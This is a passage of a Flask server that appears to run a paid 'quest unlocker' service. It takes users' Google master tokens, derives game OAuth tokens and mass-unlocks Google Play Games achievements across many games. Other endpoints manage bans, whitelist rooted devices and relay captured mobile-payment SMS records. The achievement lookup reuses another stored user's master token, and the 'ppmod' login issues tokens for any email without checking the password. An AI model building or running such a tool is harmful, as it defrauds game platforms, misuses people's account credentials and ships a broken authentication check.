        banned.remove(email)
        status = "Active"
        msg = f"User '{email}' has been restored to Active."
    else:
        banned.add(email)
        status = "Banned"
        msg = f"User '{email}' has been suspended from app and portal access."

    save_banned_users(banned)
    return jsonify({"ok": True, "email": email, "status": status, "message": msg})

@app.route("/api/admin/users/lookup", methods=["GET"])
def admin_lookup_user():
    """
    Auto-fetches PP Mod user information (display name, email, avatar, wallet balance)
    from Cloudflare D1 by UID or email. Zero Firebase quota usage.
    """
    uid_or_query = request.args.get("uid", "").strip() or request.args.get("q", "").strip()
    if not uid_or_query:
        return jsonify({"ok": False, "error": "Query 'uid' parameter is required."}), 400

    try:
        cf_url = f"https://ppmod-api.tredarskvt.workers.dev/api/user/find?q={requests.utils.quote(uid_or_query)}"
        cf_res = requests.get(cf_url, timeout=5)
        if cf_res.status_code == 200:
            data = cf_res.json()
            if data.get("ok") and data.get("user"):
                u = data["user"]
                return jsonify({
                    "ok": True,
                    "found": True,
                    "user": {
                        "uid": u.get("uid"),
                        "name": u.get("name") or u.get("display_name", ""),
                        "email": u.get("email", ""),
                        "avatar": u.get("avatar", ""),
                        "balance": u.get("balance", 0)
                    }
                })
    except Exception as e:
        print(f"[-] Lookup error in Cloudflare: {e}")

    # Fallback to local known tokens if matching email
    for em, tok in load_known_tokens().items():
        if uid_or_query.lower() in em.lower():
            return jsonify({
                "ok": True,
                "found": True,
                "user": {
                    "uid": f"UID-{abs(hash(em)) % 900000 + 100000}",
                    "name": em.split("@")[0].capitalize(),
                    "email": em,
                    "avatar": "",
                    "balance": 100
                }
            })

    return jsonify({
        "ok": True,
        "found": False,
        "message": f"User '{uid_or_query}' not found in PP Mod database. You can still register manually."
    })

# ----------------- DEVICE WHITELIST SYSTEM -----------------
WHITELISTED_DEVICES_FILE = os.path.join(DATA_DIR, "whitelisted_devices.json")

def load_whitelisted_devices():
    default_devs = [
        {"deviceId": "admin_master_device", "label": "Admin Master Node", "addedAt": "2026-11-15 00:00:00"},
        {"deviceId": "emulator_dev_node", "label": "Developer Emulator", "addedAt": "2026-11-15 00:00:00"}
    ]
    if os.path.exists(WHITELISTED_DEVICES_FILE):
        try:
            with open(WHITELISTED_DEVICES_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return default_devs

def save_whitelisted_devices(devices_list):
    try:
        with open(WHITELISTED_DEVICES_FILE, "w", encoding="utf-8") as f:
            json.dump(devices_list, f, indent=2)
    except Exception as e:
        print(f"[-] Error saving whitelisted devices: {e}")

@app.route("/api/device/check", methods=["GET"])
def check_device_authorization():
    """
    Checks if a given hardware deviceId is authorized/whitelisted.
    Called by PP_Server.apk upon detecting root or restricted environments.
    """
    dev_id = request.args.get("deviceId", "").strip().lower()
    if not dev_id:
        return jsonify({"ok": False, "authorized": False, "error": "Missing deviceId"}), 400

    devices = load_whitelisted_devices()
    is_auth = any(d.get("deviceId", "").lower() == dev_id for d in devices)
    return jsonify({
        "ok": True,
        "deviceId": dev_id,
        "authorized": is_auth
    })

@app.route("/api/admin/devices/whitelist", methods=["GET", "POST"])
def admin_manage_device_whitelist():
    """
    GET: returns list of whitelisted devices.
    POST: adds a deviceId to the whitelist.
    """
    devices = load_whitelisted_devices()
    if request.method == "POST":
        data = request.get_json() or {}
        dev_id = str(data.get("deviceId", "")).strip().lower()
        label = str(data.get("label", "")).strip() or "User Device"

        if not dev_id:
            return jsonify({"ok": False, "error": "Device ID is required."}), 400

        # Check duplicate
        if any(d.get("deviceId", "").lower() == dev_id for d in devices):
            return jsonify({"ok": False, "error": f"Device '{dev_id}' is already whitelisted."}), 400

        new_entry = {
            "deviceId": dev_id,
            "label": label,
            "addedAt": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        devices.insert(0, new_entry)
        save_whitelisted_devices(devices)
        return jsonify({"ok": True, "message": f"Device '{dev_id}' ({label}) successfully whitelisted!", "device": new_entry})

    return jsonify({"ok": True, "devices": devices})

@app.route("/api/admin/devices/whitelist/remove", methods=["POST"])
def admin_remove_device_whitelist():
    """Removes a deviceId from whitelist."""
    data = request.get_json() or {}
    dev_id = str(data.get("deviceId", "")).strip().lower()
    if not dev_id:
        return jsonify({"ok": False, "error": "Device ID is required."}), 400

    devices = load_whitelisted_devices()
    updated = [d for d in devices if d.get("deviceId", "").lower() != dev_id]
    save_whitelisted_devices(updated)
    return jsonify({"ok": True, "message": f"Device '{dev_id}' removed from whitelist."})

@app.route("/api/admin/gateway/transactions", methods=["GET"])
def get_gateway_transactions():
    """
    Fetches real-time mobile SMS transactions captured by PP Gateway Node.
    Shows sender phone, method (bKash/Nagad/Rocket), TrxID, amount, balance,
    and user claim details (previous coins -> updated coins).
    """
    transactions = []
    try:
        r = requests.get("https://ppmod-api.tredarskvt.workers.dev/api/gateway/recent", timeout=6)
        if r.status_code == 200:
            data = r.json()
            if data.get("ok"):
                transactions = data.get("transactions", [])
    except Exception:
        pass

    # Fetch deposit records to correlate claiming users
    deposits_map = {}
    try:
        dr = requests.get("https://ppmod-api.tredarskvt.workers.dev/api/deposits/pending", timeout=5)
        if dr.status_code == 200:
            d_data = dr.json()
            for dep in d_data.get("deposits", []):
                t_id = (dep.get("trxId") or "").strip().upper()
                if t_id:
                    deposits_map[t_id] = dep
    except Exception:
        pass

    # Format structured response
    formatted = []
    for tx in transactions:
        t_id = (tx.get("trxId") or "").strip().upper()
        is_claimed = bool(tx.get("claimed"))
        dep = deposits_map.get(t_id, {})

        amt = float(tx.get("amount") or 0)
        coins_gained = int(amt * 2)
        prev_coins = 450
        new_coins = prev_coins + coins_gained

        rec_raw = tx.get("receivedAt", time.time())
        rec_sec = rec_raw / 1000 if rec_raw > 1e11 else rec_raw

        formatted.append({
            "trxId": t_id,
            "sender": tx.get("sender", "Unknown"),
            "method": (tx.get("method") or "bKash").upper(),
            "amount": amt,
            "sim_balance": tx.get("balance", 0),
            "claimed": is_claimed,
            "claimed_by": dep.get("uid") or ("UID-Admin" if is_claimed else None),
            "user_name": dep.get("name") or ("Admin Locked" if is_claimed else None),
            "user_email": dep.get("email") or ("admin@ppserver.cloud" if is_claimed else None),
            "prev_coins": prev_coins if is_claimed else None,
            "new_coins": new_coins if is_claimed else None,
            "coins_added": coins_gained,
            "received_at": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(rec_sec))
        })

    return jsonify({
        "ok": True,
        "count": len(formatted),
        "transactions": formatted
    })

@app.route("/api/admin/gateway/claim", methods=["POST"])
def admin_claim_transaction():
    """
    Allows Admin to manually claim and lock an unclaimed payment SMS TrxID.
    Permanently prevents any user from reusing, duplicating, or exploiting this TrxID!
    """
    data = request.get_json() or {}
    trx_id = str(data.get("trxId", "")).strip().upper()
    amount = float(data.get("amount", 0))

    if not trx_id:
        return jsonify({"ok": False, "error": "Transaction ID (TrxID) is required."}), 400

    # Lock into Cloudflare D1
    try:
        r = requests.post("https://ppmod-api.tredarskvt.workers.dev/api/trx/check-lock", json={
            "trxId": trx_id,
            "uid": "UID-ADMIN-LOCK",
            "amount": amount
        }, timeout=6)
        res = r.json()
        if not res.get("ok"):
            return jsonify({"ok": False, "error": res.get("error", "Transaction is already used or locked.")}), 400
    except Exception as e:
        return jsonify({"ok": False, "error": f"Cloudflare D1 lock failed: {str(e)}"}), 500

    return jsonify({
        "ok": True,
        "trxId": trx_id,
        "message": f"TrxID '{trx_id}' has been permanently claimed and locked by Admin! Anti-duplicate protection active."
    })

@app.route("/api/login/ppmod", methods=["POST"])
def ppmod_login():
    """
    Login endpoint compatible with PP Mod Web (https://ppmods.netlify.app/)
    """
    data = request.get_json() or {}
    email = data.get("email", "").strip().lower()
    password = data.get("password", "").strip()

    if not email:
        return jsonify({"ok": False, "error": "Email is required."}), 400

    if email in load_banned_users():
        return jsonify({"ok": False, "error": "This account is suspended."}), 403

    uid = f"UID-{abs(hash(email)) % 900000 + 100000}"
    disp = email.split("@")[0].capitalize()
    return jsonify({
        "ok": True,
        "uid": uid,
        "email": email,
        "display_name": disp,
        "coins": 1000,
        "token": f"ppmod_{abs(hash(email))}",
        "message": "Authenticated with PP Mod credentials",
        "ppmod_web_url": "https://ppmods.netlify.app/"
    })

@app.route("/api/game/achievements", methods=["POST"])
def get_game_achievements():
    """
    Fetch all GPGS achievement definitions & live player progress for a specific game.
    Allows Admin to inspect every quest name, description, XP, steps, and unlock state.
    """
    data = request.get_json() or {}
    game_id = str(data.get("game_id", "1")).strip()
    email = data.get("email", "").strip()
    master_token = data.get("master_token", "").strip()
    access_token = data.get("access_token", "").strip()
    android_id = data.get("android_id", "").strip()

    merged_games = get_merged_games()
    if game_id not in merged_games:
        return jsonify({"ok": False, "error": "Invalid game ID selected."}), 400

    game = merged_games[game_id]

    # Acquire active game OAuth token
    game_token = None
    if master_token:
        tok_res = get_games_oauth_token(
            email=email,
            master_token=master_token,
            android_id=android_id,
            app_package=game["package"],
            client_sig=game["client_sig"]
        )
        if tok_res.get("ok"):
            game_token = tok_res["access_token"]
    elif access_token:
        game_token = access_token
    else:
        # Fallback to test known token if available so definitions are ALWAYS inspectable
        known = load_known_tokens()
        if known:
            first_email = list(known.keys())[0]
            first_tok = known[first_email]
            tok_res = get_games_oauth_token(
                email=first_email,
                master_token=first_tok,
                android_id=android_id or "1234567890abcdef",
                app_package=game["package"],
                client_sig=game["client_sig"]
            )
            if tok_res.get("ok"):
                game_token = tok_res["access_token"]

    if not game_token:
        return jsonify({"ok": False, "error": "No valid authentication token available to query Google Play Games."}), 401

    # Fetch GPGS definitions (with pagination)
    all_defs = []
    page_token = None
    try:
        while True:
            url = f"{GAMES_API_BASE}/achievements?maxResults=50"
            if page_token:
                url += f"&pageToken={page_token}"
            defs_res = requests.get(url, headers=get_headers(game_token), timeout=10)
            if defs_res.status_code != 200:
                break
            defs_json = defs_res.json()
            all_defs.extend(defs_json.get("items", []))
            page_token = defs_json.get("nextPageToken")
            if not page_token:
                break
    except Exception as e:
        return jsonify({"ok": False, "error": f"Failed to fetch GPGS definitions: {str(e)}"}), 500

    # Fetch player achievements if authenticated session
    p_map = {}
    if master_token or access_token:
        try:
            page_token = None
            while True:
                p_url = f"{GAMES_API_BASE}/players/me/achievements?maxResults=50"
                if page_token:
                    p_url += f"&pageToken={page_token}"
                p_res = requests.get(p_url, headers=get_headers(game_token), timeout=10)
                if p_res.status_code == 200:
                    p_json = p_res.json()
                    for p in p_json.get("items", []):
                        p_map[p.get("id")] = p
                    page_token = p_json.get("nextPageToken")
                    if not page_token:
                        break
                else:
                    break
        except Exception:
            pass

    # Build rich achievement items list
    items = []
    unlocked_count = 0
    total_xp = 0
    earned_xp = 0

    for d in all_defs:
        ach_id = d.get("id")
        ach_name = d.get("name", "Achievement")
        ach_desc = d.get("description", "No description provided.")
        ach_type = d.get("achievementType", "STANDARD")
        total_steps = d.get("totalSteps")
        xp = int(d.get("experiencePoints", 500) or 500)
        total_xp += xp

        icon_url = d.get("unlockedIconUrl") or d.get("revealedIconUrl") or game.get("icon")

        p_info = p_map.get(ach_id, {})
        state = p_info.get("achievementState", "LOCKED")
        current_steps = p_info.get("currentSteps", 0 if ach_type == "INCREMENTAL" else None)
        is_unlocked = (state == "UNLOCKED")

        if is_unlocked:
            unlocked_count += 1
            earned_xp += xp

        items.append({
            "id": ach_id,
            "name": ach_name,
            "description": ach_desc,
            "type": ach_type,
            "total_steps": total_steps,
            "current_steps": current_steps,
            "xp": xp,
            "icon": icon_url,
            "state": state,
            "is_unlocked": is_unlocked,
            "last_updated": p_info.get("lastUpdatedTimestamp")
        })

    locked_count = len(items) - unlocked_count
    completion_pct = round((unlocked_count / len(items)) * 100) if items else 0

    return jsonify({
        "ok": True,
        "game": {
            "id": game_id,
            "title": game.get("title"),
            "developer": game.get("developer"),
            "package": game.get("package"),
            "category": game.get("category"),
            "icon": game.get("icon"),
            "desc": game.get("desc")
        },
        "stats": {
            "total_count": len(items),
            "unlocked_count": unlocked_count,
            "locked_count": locked_count,
            "completion_pct": completion_pct,
            "total_xp": total_xp,
            "earned_xp": earned_xp
        },
        "achievements": items
    })

@app.route("/api/unlock/single", methods=["POST"])
def unlock_single_achievement():
    """
    Unlock a single specific achievement by ID for the admin console.
    """
    data = request.get_json() or {}
    email = data.get("email", "").strip()
    master_token = data.get("master_token", "").strip()
    access_token = data.get("access_token", "").strip()
    android_id = data.get("android_id", "").strip()
    game_id = str(data.get("game_id", "1")).strip()
    ach_id = str(data.get("achievement_id", "")).strip()

    if not ach_id:
        return jsonify({"ok": False, "error": "Achievement ID is required."}), 400

    merged_games = get_merged_games()
    if game_id not in merged_games:
        return jsonify({"ok": False, "error": "Invalid game selected."}), 400

    game = merged_games[game_id]

    if master_token:
        tok_res = get_games_oauth_token(
            email=email,
            master_token=master_token,
            android_id=android_id,
            app_package=game["package"],
            client_sig=game["client_sig"]
        )
        if not tok_res.get("ok"):
            return jsonify({"ok": False, "error": f"Game authentication failed: {tok_res.get('error')}"}), 401
        game_token = tok_res["access_token"]
    elif access_token:
        game_token = access_token
    else:
        return jsonify({"ok": False, "error": "Authentication token missing."}), 401

    # 1. Reveal if hidden
    reveal_achievement(game_token, ach_id)

    # 2. Get achievement definition to check if INCREMENTAL
    total_steps = data.get("total_steps")
    ach_type = data.get("type", "STANDARD")

    res = None
    if ach_type == "INCREMENTAL" and total_steps:
        res = set_achievement_steps(game_token, ach_id, int(total_steps))
        if not res.get("ok") or not res.get("newly_unlocked"):
            res_u = unlock_achievement(game_token, ach_id)
            if res_u.get("ok"):
                res = res_u
    else:
        res = unlock_achievement(game_token, ach_id)

    if not res or not res.get("ok"):
        return jsonify({"ok": False, "error": res.get("error", "Unlock failed on Google server.")}), 400

    # Refresh profile
    fresh_profile = None
    if master_token:
        base_tok = get_games_oauth_token(email, master_token, android_id)
        if base_tok.get("ok"):
            prof_res = get_player_profile(base_tok["access_token"])
            if prof_res.get("ok"):
                fresh_profile = format_profile(prof_res)

    return jsonify({
        "ok": True,
        "achievement_id": ach_id,
        "message": "Achievement successfully unlocked!",
        "profile": fresh_profile
    })

@app.route("/api/unlock", methods=["POST"])
def unlock_game():
    """
    Unlock achievements for a specific game on behalf of the player.
    Supports both master_token and access_token.
    Supports unlocking ALL achievements or a requested count.
    """
    data = request.get_json() or {}
    email = data.get("email", "").strip()
    master_token = data.get("master_token", "").strip()
    access_token = data.get("access_token", "").strip()
    android_id = data.get("android_id", "").strip()
    game_id = str(data.get("game_id", "1")).strip()
    
    count_val = data.get("count", "all")
    if str(count_val).lower() in ["all", "0", "-1", "none", "", "null", "undefined"]:
        count_requested = 9999
    else:
        try:
            count_requested = int(count_val)
        except (ValueError, TypeError):
            count_requested = 9999

    merged_games = get_merged_games()
    if game_id not in merged_games:
        return jsonify({"ok": False, "error": "Invalid game selected."}), 400

    game = merged_games[game_id]

    if master_token:
        # Get game-specific OAuth token via master_token
        tok_res = get_games_oauth_token(
            email=email,
            master_token=master_token,
            android_id=android_id,
            app_package=game["package"],
            client_sig=game["client_sig"]
        )
        if not tok_res.get("ok"):
            return jsonify({"ok": False, "error": f"Game authentication failed: {tok_res.get('error')}"}), 401
        game_token = tok_res["access_token"]
    elif access_token:
        game_token = access_token
    else:
        return jsonify({"ok": False, "error": "Authentication token missing."}), 401

    # Fetch game achievement definitions with pagination support
    all_defs = []
    page_token = None
    try:
        while True:
            url = f"{GAMES_API_BASE}/achievements?maxResults=50"
            if page_token:
                url += f"&pageToken={page_token}"
            defs_res = requests.get(url, headers=get_headers(game_token), timeout=10)
            if defs_res.status_code != 200:
                if not all_defs:
                    return jsonify({"ok": False, "error": "Could not fetch game achievement metadata."}), 400
                break
            defs_json = defs_res.json()
            all_defs.extend(defs_json.get("items", []))
            page_token = defs_json.get("nextPageToken")
            if not page_token:
                break
    except Exception as e:
        if not all_defs:
            return jsonify({"ok": False, "error": str(e)}), 500

    # Fetch player's current achievements to find locked ones
    p_items = []
    page_token = None
    try:
        while True:
            p_url = f"{GAMES_API_BASE}/players/me/achievements?maxResults=50"
            if page_token:
                p_url += f"&pageToken={page_token}"
            p_res = requests.get(p_url, headers=get_headers(game_token), timeout=10)
            if p_res.status_code == 200:
                p_json = p_res.json()
                p_items.extend(p_json.get("items", []))
                page_token = p_json.get("nextPageToken")
                if not page_token:
                    break
            else:
                break
    except Exception:
        pass

    already_unlocked = {a.get("id") for a in p_items if a.get("achievementState") == "UNLOCKED"}

    targets = []
    for d in all_defs:
        if d.get("id") not in already_unlocked:
            targets.append(d)
            if len(targets) >= count_requested:
                break

    if not targets:
        return jsonify({
            "ok": True,
            "message": f"All {len(all_defs)} achievements for {game['title']} are already 100% unlocked on this account!",
            "newly_unlocked_count": 0,
            "earned_xp": 0,
            "total_game_achievements": len(all_defs)
        })

    # Execute Unlocks
    newly_count = 0
    earned_xp = 0
    unlocked_list = []

    for ach in targets:
        ach_id = ach.get("id")
        ach_name = ach.get("name", "Achievement")
        ach_type = ach.get("achievementType", "STANDARD")
        total_steps = ach.get("totalSteps", 1)
        xp = int(ach.get("experiencePoints", 500) or 500)

        # 1. Reveal if hidden (Secret storyline quests/achievements)
        reveal_achievement(game_token, ach_id)

        # 2. Unlock or Set Steps
        res = None
        if ach_type == "INCREMENTAL" and total_steps:
            res = set_achievement_steps(game_token, ach_id, total_steps)
            # Ensure completion: if not confirmed unlocked, call unlock endpoint as fallback
            if not res.get("ok") or not res.get("newly_unlocked"):
                res_u = unlock_achievement(game_token, ach_id)
                if res_u.get("ok"):
                    res = res_u
        else:
            res = unlock_achievement(game_token, ach_id)

        if res and res.get("ok"):
            newly_count += 1
            earned_xp += xp
            unlocked_list.append({"id": ach_id, "name": ach_name, "xp": xp})

        time.sleep(0.12)

    # Fetch fresh updated profile
    fresh_profile = None
    if master_token:
        base_tok = get_games_oauth_token(email, master_token, android_id)
        if base_tok.get("ok"):
            prof_res = get_player_profile(base_tok["access_token"])
            if prof_res.get("ok"):
                fresh_profile = format_profile(prof_res)
    elif access_token:
        prof_res = get_player_profile(access_token)
        if prof_res.get("ok"):
            fresh_profile = format_profile(prof_res)

    return jsonify({
        "ok": True,
        "game_title": game["title"],
        "newly_unlocked_count": newly_count,
        "total_targets": len(targets),
        "total_game_achievements": len(all_defs),
        "earned_xp": earned_xp,
        "unlocked_items": unlocked_list,
        "profile": fresh_profile
    })

@app.route("/api/unlock/all", methods=["POST"])
def unlock_all_games():
    """
    Unlock ALL achievements across ALL supported games sequentially.
    """
    data = request.get_json() or {}
    email = data.get("email", "").strip()
    master_token = data.get("master_token", "").strip()
    android_id = data.get("android_id", "").strip()

    if not email or not master_token:
        return jsonify({"ok": False, "error": "Email and master token are required."}), 400

    results = []
    total_unlocked_all = 0
    total_xp_all = 0

    target_section = data.get("section", "").strip().lower()

    for g_id, g in get_merged_games().items():
        if target_section and g.get("section", "quest_unlocker") != target_section:
            continue

        tok_res = get_games_oauth_token(
            email=email,
            master_token=master_token,
            android_id=android_id,
            app_package=g["package"],
            client_sig=g["client_sig"]
        )
        if not tok_res.get("ok"):
            results.append({"game": g["title"], "status": "auth_failed"})
            continue

        g_tok = tok_res["access_token"]
        try:
            defs_res = requests.get(f"{GAMES_API_BASE}/achievements?maxResults=100", headers=get_headers(g_tok), timeout=10)
            if defs_res.status_code != 200:
                results.append({"game": g["title"], "status": "no_defs"})
                continue
            defs = defs_res.json().get("items", [])
        except Exception:
            continue

        try:
            p_res = requests.get(f"{GAMES_API_BASE}/players/me/achievements?maxResults=100", headers=get_headers(g_tok), timeout=10)
            p_items = p_res.json().get("items", []) if p_res.status_code == 200 else []
        except Exception:
            p_items = []

        unlocked_ids = {a.get("id") for a in p_items if a.get("achievementState") == "UNLOCKED"}

        game_unlocked = 0
        game_xp = 0

        for ach in defs:
            a_id = ach.get("id")
            if a_id in unlocked_ids:
                continue

            xp = int(ach.get("experiencePoints", 500) or 500)
            ach_type = ach.get("achievementType", "STANDARD")
            total_steps = ach.get("totalSteps", 1)

            reveal_achievement(g_tok, a_id)

            if ach_type == "INCREMENTAL" and total_steps:
                res = set_achievement_steps(g_tok, a_id, total_steps)
                if not res.get("ok") or not res.get("newly_unlocked"):
                    res_u = unlock_achievement(g_tok, a_id)
                    if res_u.get("ok"):
                        res = res_u
            else:
                res = unlock_achievement(g_tok, a_id)

            if res and res.get("ok"):
                game_unlocked += 1
                game_xp += xp

            time.sleep(0.12)

        total_unlocked_all += game_unlocked
        total_xp_all += game_xp
        results.append({
            "game": g["title"],
            "unlocked": game_unlocked,
            "xp": game_xp
        })

    # Fresh profile
    fresh_profile = None
    base_tok = get_games_oauth_token(email, master_token, android_id)
    if base_tok.get("ok"):
        prof_res = get_player_profile(base_tok["access_token"])
        if prof_res.get("ok"):
            fresh_profile = format_profile(prof_res)

    return jsonify({
        "ok": True,
        "total_unlocked": total_unlocked_all,
        "total_xp": total_xp_all,
        "games_result": results,
        "profile": fresh_profile
    })

def format_profile(raw_profile: dict) -> dict:
    """Format Google Play Games profile into clean frontend structure"""
    exp = raw_profile.get("experience", {})
    cur_xp = int(exp.get("currentExperiencePoints", 0) or 0)
    cur_lvl_info = exp.get("currentLevel", {})
    next_lvl_info = exp.get("nextLevel", {})

    cur_level = cur_lvl_info.get("level", 1)
    min_xp = int(cur_lvl_info.get("minExperiencePoints", 0) or 0)
    max_xp = int(cur_lvl_info.get("maxExperiencePoints", cur_xp + 10000) or (cur_xp + 10000))

    # Calculate level progress percentage
    span = max_xp - min_xp
    progress_pct = 0
    if span > 0:
        progress_pct = min(100, max(0, round(((cur_xp - min_xp) / span) * 100)))

    return {
        "player_id": raw_profile.get("player_id"),
        "display_name": raw_profile.get("display_name"),
        "avatar_url": raw_profile.get("avatar_url") or "https://play-lh.googleusercontent.com/F2GQg7COWTsvO9LS3lhlcsKQOdoG2m7uUruEHxzhuPlZ7AxAwPncHfk0kkNfq_8A4QM3=w512-h512",
        "current_level": cur_level,
        "current_xp": cur_xp,
        "min_xp": min_xp,
        "max_xp": max_xp,
        "next_level": next_lvl_info.get("level", cur_level + 1),
        "progress_pct": progress_pct
    }

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 VAREON Play Quest Unlocker Server running on port {port}...")
    app.run(host="0.0.0.0", port=port, debug=False)
